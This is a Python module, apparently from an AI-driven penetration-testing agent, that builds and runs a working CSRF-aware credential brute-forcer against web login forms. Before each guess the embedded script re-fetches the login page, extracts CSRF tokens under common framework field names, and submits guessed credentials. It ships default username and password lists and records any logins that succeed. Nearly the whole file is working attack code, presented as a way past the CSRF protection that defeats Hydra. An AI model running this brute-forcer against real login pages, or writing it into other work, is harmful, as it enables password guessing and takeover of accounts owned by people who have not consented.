"""build_command() and output parser for web_login_bruteforce — a real, CSRF-aware credential
brute-force against a web login form, run as its own child process (not Hydra).

Real gap this closes: Hydra's http-post-form module sends a static body template on every
attempt — it cannot refresh a per-request CSRF token, so any login form that requires one
(the common case for modern frameworks) will reject every single attempt regardless of whether
the credentials are correct. This tool instead spawns a small, fixed (never model-authored)
Python script that maintains a real httpx.Client (persistent cookies) and, before each attempt,
re-fetches the login page and extracts whatever CSRF-shaped hidden field it finds (a handful of
common framework conventions), submitting it alongside the credentials.

Same "real subprocess through background_jobs.py" shape as Hydra, not an in-process thread/task:
Stop/orphan-recovery need a real, killable PID either way, and reusing the exact same mechanism
(rather than a second, parallel in-process tracking path) is simpler to reason about and test.
The actual per-run configuration is passed via a JSON file (sys.argv[1]), never templated into the
script text itself -- avoids any string-escaping/injection concern entirely, the script is 100%
static.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

from agent.tools.builders.validators import validate_target
from agent.tools.wordlist_store import get_assigned_wordlist

_DEFAULT_USERNAMES = ["admin", "root", "administrator", "user", "test"]
_DEFAULT_PASSWORDS = ["admin", "password", "123456", "root", "toor", "letmein", "changeme", ""]

# Unlike Hydra (a compiled tool built for high-throughput network brute-forcing), each attempt
# here is a real GET+POST round trip through Python/httpx -- an assigned wordlist meant for Hydra
# (e.g. rockyou.txt's 14M lines) would never come close to finishing and would serialize an
# enormous usernames/passwords array into this job's own JSON config for no benefit, since the
# background job's own timeout (HYDRA_TIMEOUT_SECONDS) kills it long before it gets there anyway.
_MAX_ASSIGNED_WORDLIST_LINES = 500


def _load_wordlist_lines(path: str, cap: int) -> list[str]:
    lines: list[str] = []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.rstrip("\n")
            if line:
                lines.append(line)
            if len(lines) >= cap:
                break
    return lines

# Static script text -- config is passed via a JSON file (sys.argv[1]), never templated into this
# string, so there is no escaping/injection concern to worry about at all.
_SCRIPT = '''\
import json
import re
import sys

import httpx

_CSRF_FIELD_NAMES = [
    "csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token", "_csrf", "csrf",
    "__RequestVerificationToken",
]


def extract_csrf_token(html, custom_field):
    names = ([custom_field] if custom_field else []) + _CSRF_FIELD_NAMES
    for name in names:
        escaped = re.escape(name)
        pattern_a = r'name=["\\']' + escaped + r'["\\'][^>]*value=["\\']([^"\\']*)["\\']'
        m = re.search(pattern_a, html, re.IGNORECASE)
        if not m:
            pattern_b = r'value=["\\']([^"\\']*)["\\'][^>]*name=["\\']' + escaped + r'["\\']'
            m = re.search(pattern_b, html, re.IGNORECASE)
        if m:
            return name, m.group(1)
    return None


def main():
    with open(sys.argv[1], encoding="utf-8") as f:
        cfg = json.load(f)

    found = []
    headers = dict(cfg.get("extra_headers") or {})
    if cfg.get("user_agent"):
        headers["User-Agent"] = cfg["user_agent"]
    with httpx.Client(timeout=15.0, follow_redirects=True, headers=headers) as client:
        for username in cfg["usernames"]:
            for password in cfg["passwords"]:
                try:
                    get_resp = client.get(cfg["login_url"])
                    token = extract_csrf_token(get_resp.text, cfg.get("csrf_field"))
                    data = {cfg["username_field"]: username, cfg["password_field"]: password}
                    if token:
                        data[token[0]] = token[1]
                    post_resp = client.post(cfg["login_url"], data=data)
                    body = post_resp.text
                    if cfg.get("success_string"):
                        matched = cfg["success_string"].lower() in body.lower()
                    else:
                        matched = cfg["failure_string"].lower() not in body.lower()
                    print(f"tried {username}:{password} -> matched={matched}", flush=True)
                    if matched:
                        found.append({"username": username, "password": password})
                except httpx.HTTPError as exc:
                    print(f"error on {username}:{password}: {exc}", flush=True)

    with open(cfg["result_path"], "w", encoding="utf-8") as f:
        json.dump({"credentials": found}, f)


if __name__ == "__main__":
    main()
'''


def build_web_login_bruteforce_command(params: dict, job_id: str, job_dir: Path) -> list[str]:
    target = validate_target(params["target"])
    login_path = params.get("login_path")
    if not login_path:
        raise ValueError("login_path is required")

    failure_string = params.get("failure_string")
    success_string = params.get("success_string")
    if not failure_string and not success_string:
        raise ValueError("failure_string or success_string is required")

    # Precedence: explicit model choice, then the operator's own Settings-UI wordlist assignment
    # for this specific (slower) tool, then the small built-in default.
    username = params.get("username")
    username_list = params.get("username_list")
    if username:
        usernames = [str(username)]
    elif username_list:
        usernames = [str(u) for u in username_list]
    else:
        assigned = get_assigned_wordlist("web_login_bruteforce_usernames")
        usernames = _load_wordlist_lines(assigned, _MAX_ASSIGNED_WORDLIST_LINES) if assigned else list(_DEFAULT_USERNAMES)

    password = params.get("password")
    password_list = params.get("password_list")
    if password:
        passwords = [str(password)]
    elif password_list:
        passwords = [str(p) for p in password_list]
    else:
        assigned = get_assigned_wordlist("web_login_bruteforce_passwords")
        passwords = _load_wordlist_lines(assigned, _MAX_ASSIGNED_WORDLIST_LINES) if assigned else list(_DEFAULT_PASSWORDS)

    result_path = job_dir / f"{job_id}_result.json"
    config = {
        "login_url": target.rstrip("/") + login_path,
        "username_field": str(params.get("username_field") or "username"),
        "password_field": str(params.get("password_field") or "password"),
        "csrf_field": params.get("csrf_field"),
        "usernames": usernames,
        "passwords": passwords,
        "failure_string": failure_string,
        "success_string": success_string,
        "user_agent": params.get("_user_agent"),
        "extra_headers": params.get("_extra_headers"),
        "result_path": str(result_path),
    }
    config_path = job_dir / f"{job_id}_config.json"
    config_path.write_text(json.dumps(config), encoding="utf-8")

    script_path = job_dir / f"{job_id}_script.py"
    script_path.write_text(_SCRIPT, encoding="utf-8")

    return [sys.executable, str(script_path), str(config_path)]


def parse_web_login_bruteforce_result(result_path: Path) -> dict:
    if not result_path.exists():
        return {"credentials": []}
    try:
        record = json.loads(result_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return {"credentials": []}
    return {"credentials": record.get("credentials", [])}
